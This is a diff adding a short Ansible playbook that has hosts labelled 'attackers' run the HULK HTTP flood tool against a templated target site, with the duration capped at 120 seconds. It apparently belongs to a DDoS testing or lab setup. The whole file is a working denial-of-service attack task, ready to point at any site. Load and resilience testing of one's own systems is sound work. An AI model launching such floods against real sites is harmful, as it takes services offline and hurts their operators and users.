@@ -1,0 +1,10 @@
+---
+- name: HULK attack
+  hosts: attackers
+  gather_facts: false
+  become: true
+
+  tasks:
+    - name: Run HULK (HTTP Unbearable Load King)
+      shell: "timeout {{ [duration | int, 120] | min }}s /opt/hulk/hulk -site {{ target }}"
+      ignore_errors: true
